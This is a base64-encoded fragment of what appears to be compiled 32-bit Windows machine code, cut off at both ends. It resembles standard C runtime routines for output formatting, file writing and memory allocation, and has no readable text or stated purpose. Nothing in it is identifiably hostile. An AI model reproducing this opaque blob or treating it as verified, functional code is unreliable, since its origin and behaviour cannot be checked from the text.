034iVAMi0XoqQACAAB0DYPPAok9BCNCAOsCM8D3wQAAEAB0TYPOBMcFACNCAAIAAACJNVAOQgD3wQAAAAh0MvfBAAAAEHQqg84IxwUAI0IAAwAAAIk1UA5CAKggdBODziDHBQAjQgAFAAAAiTVQDkIAX14zwFuL5V3DVYvsi0UIZosIg8ACZoXJdfUrRQjR+Ehdw1WL7IPsEKGQAkIAM8WJRfxTVleLfQz2RwxAD4U2AQAAV+gYo///u4AGQgBZg/j/dC5X6Aej//9Zg/j+dCJX6Pui//+L8FfB/gXo8KL//4PgH1nB4AYDBLWoH0IAWesCi8OKQCQkfzwCD4ToAAAAV+jKov//WYP4/3QuV+i+ov//WYP4/nQiV+iyov//i/BXwf4F6Kei//+D4B9ZweAGAwS1qB9CAFnrAovDikAkJH88AQ+EnwAAAFfogaL//1mD+P90LlfodaL//1mD+P50IlfoaaL//4vwV8H+Beheov//i9iD4x9ZweMGAxy1qB9CAFn2QwSAdF//dQiNRfRqBVCNRfBQ6N9KAACDxBCFwHQHuP//AADrXjP2OXXwfjL/TwR4EosPikQ19IgBiwcPtghAiQfrEA++RDX0V1Do9AoAAFlZi8iD+f90xkY7dfB8zmaLRQjrH4NHBP6LRQh4CosPZokBgwcC6wwPt8BXUOiQSgAAWVmLTfxfXjPNW+jBmf//i+Vdw2oUaMDuQQDonsP//zP2iXXki30Ig//+dRDoTMf//8cACQAAAOm3AAAAhf8PiJ8AAAA7PSQlQgAPg5MAAACLx8H4BYlF4Ivfg+MfweMGiwSFqB9CAA++RAMEg+ABdHJX6KTh//9ZiXX8i0XgiwSFqB9CAPZEAwQBdChX6J3i//9ZUP8VhHBBAIXAdQj/FeBwQQCL8Il15IX2dBjol8b//4kw6MTG///HAAkAAACDzv+JdeTHRfz+////6AoAAACLxushi30Ii3XkV+i14v//WcPolcb//8cACQAAAOgbxv//g8j/6AfD///DahBo4O5BAOi1wv//M9uJXeSLdQiD/v51F+gvxv//iRjoXMb//8cACQAAAOm2AAAAhfYPiJcAAAA7NSQlQgAPg4sAAACL3sH7BYv+g+cfwecGiwSdqB9CAA++RDgEg+ABdQro5sX//4MgAOtqVuit4P//WYNl/ACLBJ2oH0IA9kQ4BAF0E/91EP91DFboXgAAAIPEDIv46xbo5MX//8cACQAAAOilxf//gyAAg8//iX3kx0X8/v///+gKAAAAi8frKIt1CIt95FbozeH//1nD6HnF//+JGOimxf//xwAJAAAA6CzF//+DyP/oGML//8NVi+y48BoAAOglLgAAoZACQgAzxYlF/IOlROX//wCLRQiLTQxWM/aJhTjl//9XM/+JjTDl//+JtUDl//85dRB1BzPA6Q0IAACFyXUf6A3F//8hMOg6xf//xwAWAAAA6MDE//+DyP/p6gcAAIvQi8jB+gWD4R/B4QaJlSjl//9TixSVqB9CAImNJOX//4pcESQC29D7gPsCdAWA+wF1K4tFEPfQqAF1HOiyxP//ITDo38T//8cAFgAAAOhlxP//6YgHAACLhTjl///2RBEEIHQPagJqAGoAUOgnSgAAg8QQ/7U45f//6JCg//9ZhcAPhFADAACLhSjl//+LjSTl//+LBIWoH0IA9kQBBIAPhDIDAADo6NT//zPJi0BsOYioAAAAjYUY5f//UIuFKOX//w+UwYmNPOX//4uNJOX//4sEhagfQgD/NAH/FTxxQQCFwA+E7gIAADm1POX//3QIhNsPhN4CAAD/FYBwQQCLlTDl//8zySGNOOX//4mFEOX//4mNNOX//4mVLOX//zlNEA+GgQYAAIuFLOX//zPSiZVA5f//x4UU5f//CgAAACG9POX//4TbD4WuAQAAihAzwIuNJOX//4D6Cg+UwImFGOX//4uFKOX//4sEhagfQgCJhTzl//85fAE4dByKRAE0iEX0i4U85f//iFX1agIhfAE4jUX0UOtaD77CUOjRp///WYXAdESLhTDl//+LlSzl//8rwgNFEIP4AQ+G2wEAAGoCUo2FNOX//1Do3SsAAIPEDIP4/w+EBQMAAIuFLOX//0D/hUDl///rJmoB/7Us5f//jYU05f//UOiuKwAAg8QMg/j/D4TWAgAAi4Us5f//M8lA/4VA5f//UVFqBYmFLOX//41F9FBqAY2FNOX//1BR/7UQ5f///xUYcUEAiYU85f//hcAPhJUCAABqAI2NOOX//1GLjSTl//9QjUX0UIuFKOX//4sEhagfQgD/NAH/FQhxQQCFwA+ETAEAAIu1QOX//4uNROX//wPxi4U85f//OYU45f//D4xJAgAAOb0Y5f//dEuLjSTl//+NhTjl//9qAFBqAY1F9MZF9A1Qi4Uo5f//iwSFqB9CAP80Af8VCHFBAIXAD4TtAAAAg7045f//AQ+M9wEAAP+FROX//0aLjTTl///phgAAAID7AXQFgPsCdTMPtwgz0mY7jRTl//+JjTTl//8PlMKDwAKJlTzl//+LlUDl//+DwgKJhSzl//+JlUDl//+A+wF0BYD7AnVLUejfBAAAWYuNNOX//2Y7wXV1g8YCOb085f//dCJqDVhQiYU05f//6LkEAABZi4005f//ZjvBdU9G/4VE5f//i5VA5f//i4Us5f//O1UQD4Kp/f//6UUBAACLnSjl//9GigKLlSTl//+LDJ2oH0IAiEQKNIsEnagfQgDHRAI4AQAAAOkXAQAA/xXgcEEAi/jpCgEAAIuFKOX//4sMhagfQgCLhSTl///2RAgEgA+EdQMAAIuVMOX//zP/ib005f//hNsPhQ4BAACLXRCJlTjl//+F2w+EjQMAADPJjb306///i8KJjTzl//8rhTDl//87w3NEigpCQIiNH+X//4D5ComVOOX//4uNPOX//3UL/4VE5f//xgcNR0GKlR/l//+IF0eLlTjl//9BiY085f//gfn/EwAAcriLjSTl//+NhfTr//8r+I2FIOX//2oAUFeNhfTr//9Qi4Uo5f//iwSFqB9CAP80Af8VCHFBAIXAD4QT////A7Ug5f//Ob0g5f//fBaLlTjl//+LwiuFMOX//zvDD4JB////i7005f//i41E5f//hfYPhfUCAACF/w+ErAIAAGoFWzv7D4WYAgAA6B/A///HAAkAAADo4L///4kY6cYCAACLyoD7Ag+F6gAAADl1EA+GfAIAAMeFFOX//woAAACDpRjl//8AjZ306///i8FqDSvCi5UY5f//XjtFEHMzD7c5g8ACg8ECZju9FOX//3UQg4VE5f//AmaJM4PDAoPCAmaJO4PCAoPDAoH6/hMAAHLIjYX06///iY085f//i40k5f//K9hqAI2FIOX//1BTjYX06///UIuFKOX//4sEhagfQgD/NAH/FQhxQQCLtUDl//+LvTTl//+FwA+E8v3//wO1IOX//4m1QOX//zmdIOX//w+M8f7//4uNPOX//4vBi5Uw5f//K8I7RRAPgi7////p0/7//4tdEImNOOX//4XbD4SKAQAAx4UU5f//CgAAAIOlGOX//wCNhUjl//+LvTjl//8ryouVGOX//zvLczsPtzeDwQKDxwKJvTjl//9mO7UU5f//dRJqDV9miTiDwAKLvTjl//+DwgJmiTCDwgKDwAKB+qgGAABywTP2jY2c8v//VlZoVQ0AAFGNjUjl//8rwZkrwtH4UIvBUFZo6f0AAP8VGHFBAIu1QOX//4u9NOX//4mFPOX//4XAD4QA/f//M8mJjUDl//9qACvBjZUg5f//UlCNhZzy//8DwYuNJOX//1CLhSjl//+LBIWoH0IA/zQB/xUIcUEAhcB0HouNQOX//wONIOX//4uFPOX//4mNQOX//zvBf6/rGv8V4HBBAIuNQOX//4v4i4U85f//ib005f//O8EPj5r9//+LjTjl//+L8YuVMOX//yvyibVA5f//O/MPgsT+///pd/3//2oAjZUg5f//Uv91EP+1MOX///80CP8VCHFBAIXAD4Q9/P//i7Ug5f//M//pR/3//1foZb3//1nrPIuVMOX//4uFKOX//4uNJOX//4sEhagfQgD2RAEEQHQJgDoadQQzwOsc6FW9///HABwAAADoFr3//4MgAIPI/+sEK/GLxluLTfxfM81e6ISP//+L5V3DVYvsi0UUhcB+C1D/dRDom6v//1lZ/3Uc/3UYUP91EP91DP91COjMNAAAg8QYXcNVi+xRocwOQgCD+P51CujmQgAAocwOQgCD+P91B7j//wAA6xtqAI1N/FFqAY1NCFFQ/xV8cEEAhcB04maLRQiL5V3DVYvsVot1DFdW6PuW//9Zi04Mi/j2wYJ1F+idvP//xwAJAAAAg04MIIPI/+kbAQAA9sFAdA3ogbz//8cAIgAAAOviUzPb9sEBdBOJXgT2wRB0fYtGCIPh/okGiU4Mi0YMg+DviV4Eg8gCiUYMqQwBAAB1KuhPl///g8AgO/B0DOhDl///g8BAO/B1C1foEpj//1mFwHUHVug5QgAAWfdGDAgBAAB0eotWCIsOK8qJTQyNQgGJBotGGEiJRgSFyX4XUVJX6HL1//+DxAyL2OtHg8kgiU4M62iD//90G4P//nQWi8eLz8H4BYPhH8HhBgMMhagfQgDrBbmABkIA9kEEIHQUagJTU1foJEAAACPCg8QQg/j/dCWLTgiKRQiIAesWM8BAUIlFDI1FCFBX6An1//+DxAyL2DtdDHQJg04MIIPI/+sGi0UID7bAW19eXcNVi+yB7IgEAAChkAJCADPFiUX8i0UIjY2w+///U1aJhdj7//+LRQxX/3UQi30UiYX4+///M8CL2Im98Pv//4mFpPv//4vwiZ3s+///iYXQ+///iYXo+///iYXc+///iYWo+///iYXA+///iYXU+///6NOc///o8rr//4mFnPv//zmd2Pv//3Uq6N+6///HABYAAADoZbr//zidvPv//3QKi4W4+///g2Bw/YPI/+n1CgAAi5X4+///hdJ0zA+3EjPJiY30+///i8GJheD7//+Jjcz7//+Jjaz7//+JleT7//9mhdIPhKoKAADHhZD7//9YAAAAx4WM+///ZAAAAMeFiPv//2kAAADHhZj7//9vAAAAg4X4+///AoXAD4hzCgAAaliNQuBfZjvHdw8Pt8IPvoBAukEAg+AP6wIzwIu9zPv//w++vMdgukEAi8eJvcz7//+LvfD7///B+ASJhcz7//+D+AcPhwsKAAD/JIXIsEAAM8CDjej7////i9iJhaj7//+JhcD7//+JhdD7//+Jhdz7//+Jnez7//+JhdT7///p0AkAAA+3wmogWivCdEaD6AN0OYPoCHQvSEh0HYPoA4uF+Pv//w+FrwkAAIPLCImd7Pv//+mhCQAAg8sEiZ3s+///6Y0JAACDywHr8IHLgAAAAOvog8sC6+NqKlhmO9B1L4sHg8cEib3w+///iYXQ+///hcAPiVoJAACDywT32Imd7Pv//4mF0Pv//+lECQAAa43Q+///Cg+3woPB0APBiYXQ+///6SQJAAAzwImF6Pv//+kdCQAAaipYZjvQdSuLB4PHBImF6Pv//4XAi4X4+///ib3w+///D4n8CAAAg43o+////+nwCAAAa43o+///Cg+3woPB0APBiYXo+///6coIAAAPt8KD+El0V4P4aHRIamxaO8J0GoP4d4uF+Pv//w+FswgAAIHLAAgAAOn8/v//i4X4+///ZjkQdRSDwAKBywAQAACJhfj7///p3f7//4PLEOnV/v//aiBYC9jp2f7//4uF+Pv//w+3AIP4NnUji734+///ZoN/AjR1FovHg8AEgcsAgAAAiYX4+///6Zr+//+D+DN1I4u9+Pv//2aDfwIydRaLx4PABIHj/3///4mF+Pv//+ly/v//ZjuFjPv//w+ECwgAAGY7hYj7//8PhP4HAABmO4WY+///D4TxBwAAg/h1D4ToBwAAg/h4D4TfBwAAZjuFkPv//w+E0gcAADPAiYXM+///jYXg+///x4XU+///AQAAAFD/tdj7//9S6DsIAACDxAzpnwcAAA+3woP4ZA+PKQIAAA+EsQIAAIP4Uw+PJQEAAHR9g+hBdBBISHRYSEh0CEhID4WaBQAAaiBYA9DHhaj7//8BAAAAiZXk+///i4Xo+///jbX8+///g8tAuQACAACJnez7//+JjfT7//+FwA+JjgIAAMeF6Pv//wYAAADp3wIAAPfDMAgAAA+F2AAAAGogWAvYiZ3s+///6cgAAAD3wzAIAAB1C2ogWAvYiZ3s+///i5Xo+///v////3+D+v90Aov6i7Xw+///g8YEibXw+///i3b89sMgD4S/BAAAhfZ1Bos10A5CADPJi8aJheT7//+JjfT7//+F/w+O0AQAAIoAhMAPhMYEAACNjbD7//8PtsBRUOiYmv//WYXAi4Xk+///WXQBQIuN9Pv//0BBiYXk+///iY30+///O898wemMBAAAg+hYD4TcAgAASEgPhIsAAACD6AcPhO3+//9ISA+FagQAAA+3B4PHBMeF1Pv//wEAAACJvfD7//+JhaD7///2wyB0RIiFxPv//zPAiIXF+///jYWw+///UIuFsPv///9wdI2FxPv//1CNhfz7//9Q6HkdAACDxBCFwHkTx4XA+///AQAAAOsHZomF/Pv//zPJjbX8+///QenqAwAAiweDxwSJvfD7//+FwHQ2i3AEhfZ0L/fDAAgAAHQXD78AmSvCx4XU+///AQAAAIvI6bMDAAAzyYmN1Pv//w+/COmlAwAAizXQDkIAVui+GAAAWYvI6ZEDAACD+HAPj+sBAAAPhNcBAACD+GUPjH8DAACD+GcPjvH9//9qaVo7wnRmg/hudCdqb1o7wg+FXwMAAMeF5Pv//wgAAACE23lbgcsAAgAAiZ3s+///602DxwSJvfD7//+Lf/zoYTsAAIXAD4RFBQAAi4Xg+///9sMgdAVmiQfrAokHx4XA+///AQAAAOnDBAAAg8tAiZ3s+///x4Xk+///CgAAAPfDAIAAAHUM98MAEAAAD4SXAQAAiw+DxwiJvfD7//+Lf/zpsAEAAHUUamdYZjvQdVbHhej7//8BAAAA60o7wX4Ii8GJhej7//89owAAAH43jbhdAQAAV+gPsP//i5Xk+///iYWs+///WYXAdAqL8Im99Pv//+sKx4Xo+///owAAAIu98Pv//4sHg8cIiYV4+///ib3w+///i0f8iYV8+///jYWw+///UP+1qPv//w++wv+16Pv//1D/tfT7//+NhXj7//9WUP817AZCAP8V2HBBAP/Qi/uDxByB54AAAAB0IYO96Pv//wB1GI2FsPv//1BW/zX4BkIA/xXYcEEA/9BZWWpnWGY5heT7//91HIX/dRiNhbD7//9QVv819AZCAP8V2HBBAP/QWVmAPi0PhR7+//+BywABAABGiZ3s+///6Qz+///Hhej7//8IAAAAagfrHIPocw+Ee/z//0hID4SS/v//g+gDD4WJAQAAaifHheT7//8QAAAAWImFpPv//4TbD4l4/v//ajBZg8BRZomNyPv//2aJhcr7///Hhdz7//8CAAAA6VX+//+DxwSJvfD7///2wyB0EfbDQHQGD79H/OsOD7dH/OsI9sNAdAyLR/yZi8iL+jPA6weLT/wzwIv49sNAdBw7+H8YfAQ7yHMS99kT+PffgcsAAQAAiZ3s+///98MAkAAAdQKL+IuV6Pv//4XSeQUz0kLrFoPj94md7Pv//4H6AAIAAH4FugACAACLwQvHdQaJhdz7//+Ntfv9//+LwkqJlej7//+FwH8Gi8ELx3Q9i4Xk+///mVJQV1HovhQAAIPBMImdhPv//4mF9Pv//4v6g/k5fgYDjaT7//+Llej7//+IDk6LjfT7///rsIud7Pv//42N+/3//yvORomN9Pv///fDAAIAAHRFhcl0BYA+MHQ8TkFqMFiIBusthfZ1Bos11A5CAMeF1Pv//wEAAACLzoX/dA8zwE9mOQF0B4PBAoX/dfMrztH5iY30+///g73A+///AA+FrQEAAPbDQHQg98MAAQAAD4QdAQAAai1YZomFyPv//8eF3Pv//wEAAABqIFqLvdD7//+Lhdz7//8r+Sv49sMMdR2NheD7//9Q/7XY+///V1LoPwIAAIuF3Pv//4PEEP+1nPv//42N4Pv//1H/tdj7//9QjYXI+///UOh+DgAAg8QU9sMIdB/2wwR1Go2F4Pv//1D/tdj7//9XajBYUOjyAQAAg8QQg73U+///AIuF9Pv//w+FswAAAIXAD46rAAAAi86JteT7//9IiYWE+///jYWw+///UIuFsPv///9wdI2FoPv//1FQ6GwYAACDxBCJhZT7//+FwH5njYXg+///UP+12Pv///+1oPv//+hNAQAAi43k+///g8QMA42U+///i4WE+///iY3k+///hcB/mOtW9sMBdAdqK+nZ/v//9sMCD4Ti/v//aiBaZomVyPv//8eF3Pv//wEAAADpzP7//4PI/4mF4Pv//+sj/7Wc+///jY3g+///Uf+12Pv//1BW6HcNAACDxBSLheD7//+FwHgf9sMEdBqNheD7//9Q/7XY+///V2ogWFDo5gAAAIPEEIuFrPv//4XAdA9Q6P2E//8zwFmJhaz7//+LjfT7//+Lhfj7//8PtxCLheD7//+JleT7//9mhdIPhX71//+Avbz7//8AdAqLjbj7//+DYXD9i038X14zzVvoC4L//4vlXcPor6///8cAFgAAAOg1r///gL28+///AA+E1fT//4uNuPv//4NhcP3pxvT//5CoQABWpkAAiqZAAN+mQAAwp0AAPadAAIqnQAC1qEAAVYvsi0UM9kAMQHQGg3gIAHQdUP91COhd5v//WVm5//8AAGY7wXUIi0UQgwj/XcOLRRD/AF3DVYvsVot1DIX2fh5Xi30UV/91EE7/dQjorv///4PEDIM//3QEhfZ/519eXcNVi+yB7IgEAAChkAJCADPFiUX8i0UIjY20+///U1aJhdj7//+LRQxX/3UQi30UiYX4+///M8CL2Im98Pv//4mFrPv//4vwiZ3s+///iYXQ+///iYXo+///iYXc+///iYWo+///iYWw+///iYXU+///6G2Q///ojK7//4mFoPv//zmd2Pv//3Uq6Hmu///HABYAAADo/63//zidwPv//3QKi4W8+///g2Bw/YPI/+kQCwAAi5X4+///hdJ0zA+3EjPJiY30+///i8GJheD7//+Jjcz7//+JjaT7//+JleT7//9mhdIPhMUKAADHhZD7//9YAAAAx4WM+///ZAAAAMeFiPv//2kAAADHhZj7//9vAAAAg4X4+///AoXAD4h/CgAAaliNQuBfZjvHdw8Pt8IPtoCgukEAg+AP6wIzwIu9zPv//2vACQ+2vDjAukEAi8eJvcz7//+LvfD7///B6ASJhcz7//+D+AgPhJEKAACD+AcPhwsKAAD/JIVmvUAAM8CDjej7////i9iJhaj7//+JhbD7//+JhdD7//+Jhdz7//+Jnez7//+JhdT7///p0AkAAA+3wmogWivCdEaD6AN0OYPoCHQvSEh0HYPoA4uF+Pv//w+FrwkAAIPLCImd7Pv//+mhCQAAg8sEiZ3s+///6Y0JAACDywHr8IHLgAAAAOvog8sC6+NqKlhmO9B1L4sHg8cEib3w+///iYXQ+///hcAPiVoJAACDywT32Imd7Pv//4mF0Pv//+lECQAAa43Q+///Cg+3woPB0APBiYXQ+///6SQJAAAzwImF6Pv//+kdCQAAaipYZjvQdSuLB4PHBImF6Pv//4XAi4X4+///ib3w+///D4n8CAAAg43o+////+nwCAAAa43o+///Cg+3woPB0APBiYXo+///6coIAAAPt8KD+El0V4P4aHRIamxaO8J0GoP4d4uF+Pv//w+FswgAAIHLAAgAAOn8/v//i4X4+///ZjkQdRSDwAKBywAQAACJhfj7///p3f7//4PLEOnV/v//aiBYC9jp2f7//4uF+Pv//w+3AIP4NnUji734+///ZoN/AjR1FovHg8AEgcsAgAAAiYX4+///6Zr+//+D+DN1I4u9+Pv//2aDfwIydRaLx4PABIHj/3///4mF+Pv//+ly/v//ZjuFjPv//w+ECwgAAGY7hYj7//8PhP4HAABmO4WY+///D4TxBwAAg/h1D4ToBwAAg/h4D4TfBwAAZjuFkPv//w+E0gcAADPAiYXM+///jYXg+///x4XU+///AQAAAFD/tdj7//9S6Mn7//+DxAzpnwcAAA+3woP4ZA+PKQIAAA+EsQIAAIP4Uw+PJQEAAHR9g+hBdBBISHRYSEh0CEhID4WaBQAAaiBYA9DHhaj7//8BAAAAiZXk+///i4Xo+///jbX8+///g8tAuQACAACJnez7//+JjfT7//+FwA+JjgIAAMeF6Pv//wYAAADp3wIAAPfDMAgAAA+F2AAAAGogWAvYiZ3s+///6cgAAAD3wzAIAAB1C2ogWAvYiZ3s+///i5Xo+///v////3+D+v90Aov6i7Xw+///g8YEibXw+///i3b89sMgD4S/BAAAhfZ1Bos10A5CADPJi8aJheT7//+JjfT7//+F/w+O0AQAAIoAhMAPhMYEAACNjbT7//8PtsBRUOgmjv//WYXAi4Xk+///WXQBQIuN9Pv//0BBiYXk+///iY30+///O898wemMBAAAg+hYD4TcAgAASEgPhIsAAACD6AcPhO3+//9ISA+FagQAAA+3B4PHBMeF1Pv//wEAAACJvfD7//+JhZz7///2wyB0RIiFxPv//zPAiIXF+///jYW0+///UIuFtPv///9wdI2FxPv//1CNhfz7//9Q6AcRAACDxBCFwHkTx4Ww+///AQAAAOsHZomF/Pv//zPJjbX8+///QenqAwAAiweDxwSJvfD7//+FwHQ2i3AEhfZ0L/fDAAgAAHQXD78AmSvCx4XU+///AQAAAIvI6bMDAAAzyYmN1Pv//w+/COmlAwAAizXQDkIAVuhMDAAAWYvI6ZEDAACD+HAPj+sBAAAPhNcBAACD+GUPjH8DAACD+GcPjvH9//9qaVo7wnRmg/hudCdqb1o7wg+FXwMAAMeF5Pv//wgAAACE23lbgcsAAgAAiZ3s+///602DxwSJvfD7//+Lf/zo7y4AAIXAD4RUBQAAi4Xg+///9sMgdAVmiQfrAokHx4Ww+///AQAAAOnDBAAAg8tAiZ3s+///x4Xk+///CgAAAPfDAIAAAHUM98MAEAAAD4SXAQAAiw+DxwiJvfD7//+Lf/zpsAEAAHUUamdYZjvQdVbHhej7//8BAAAA60o7wX4Ii8GJhej7//89owAAAH43jbhdAQAAV+ido///i5Xk+///iYWk+///WYXAdAqL8Im99Pv//+sKx4Xo+///owAAAIu98Pv//4sHg8cIiYV4+///ib3w+///i0f8iYV8+///jYW0+///UP+1qPv//w++wv+16Pv//1D/tfT7//+NhXj7//9WUP817AZCAP8V2HBBAP/Qi/uDxByB54AAAAB0IYO96Pv//wB1GI2FtPv//1BW/zX4BkIA/xXYcEEA/9BZWWpnWGY5heT7//91HIX/dRiNhbT7//9QVv819AZCAP8V2HBBAP/QWVmAPi0PhR7+//+BywABAABGiZ3s+///6Qz+///Hhej7//8IAAAAagfrHIPocw+Ee/z//0hID4SS/v//g+gDD4WJAQAAaifHheT7//8QAAAAWImFrPv//4TbD4l4/v//ajBZg8BRZomNyPv//2aJhcr7///Hhdz7//8CAAAA6VX+//+DxwSJvfD7///2wyB0EfbDQHQGD79H/OsOD7dH/OsI9sNAdAyLR/yZi8iL+jPA6weLT/wzwIv49sNAdBw7+H8YfAQ7yHMS99kT+PffgcsAAQAAiZ3s+///98MAkAAAdQKL+IuV6Pv//4XSeQUz0kLrFoPj94md7Pv//4H6AAIAAH4FugACAACLwQvHdQaJhdz7//+Ntfv9//+LwkqJlej7//+FwH8Gi8ELx3Q9i4Xk+///mVJQV1HoTAgAAIPBMImdhPv//4mF9Pv//4v6g/k5fgYDjaz7//+Llej7//+IDk6LjfT7///rsIud7Pv//42N+/3//yvORomN9Pv///fDAAIAAHRFhcl0BYA+MHQ8TkFqMFiIBusthfZ1Bos11A5CAMeF1Pv//wEAAACLzoX/dA8zwE9mOQF0B4PBAoX/dfMrztH5iY30+///g72w+///AA+FrQEAAPbDQHQg98MAAQAAD4QdAQAAai1YZomFyPv//8eF3Pv//wEAAABqIFqLvdD7//+Lhdz7//8r+Sv49sMMdR2NheD7//9Q/7XY+///V1LozfX//4uF3Pv//4PEEP+1oPv//42N4Pv//1H/tdj7//9QjYXI+///UOgMAgAAg8QU9sMIdB/2wwR1Go2F4Pv//1D/tdj7//9XajBYUOiA9f//g8QQg73U+///AIuF9Pv//w+FswAAAIXAD46rAAAAi86JteT7//9IiYWE+///jYW0+///UIuFtPv///9wdI2FnPv//1FQ6PoLAACDxBCJhZT7//+FwH5njYXg+///UP+12Pv///+1nPv//+jb9P//i43k+///g8QMA42U+///i4WE+///iY3k+///hcB/mOtW9sMBdAdqK+nZ/v//9sMCD4Ti/v//aiBaZomVyPv//8eF3Pv//wEAAADpzP7//4PI/4mF4Pv//+sj/7Wg+///jY3g+///Uf+12Pv//1BW6AUBAACDxBSLheD7//+FwHgf9sMEdBqNheD7//9Q/7XY+///V2ogWFDodPT//4PEEIuFpPv//4XAdA9Q6It4//8zwFmJhaT7//+LjfT7//+Lhfj7//8PtxCLheD7//+JleT7//9mhdIPhXL1//+Ljcz7//+FyXQFg/kHdVCAvcD7//8AdAqLjbz7//+DYXD9i038X14zzVvoinX//4vlXcPoLqP//8cAFgAAAOi0ov//gL3A+///AA+EuvT//4uNvPv//4NhcP3pq/T//+gCo///xwAWAAAA6Iii//+AvcD7//8A6YP0//+QArVAAMiyQAD8skAAUbNAAKKzQ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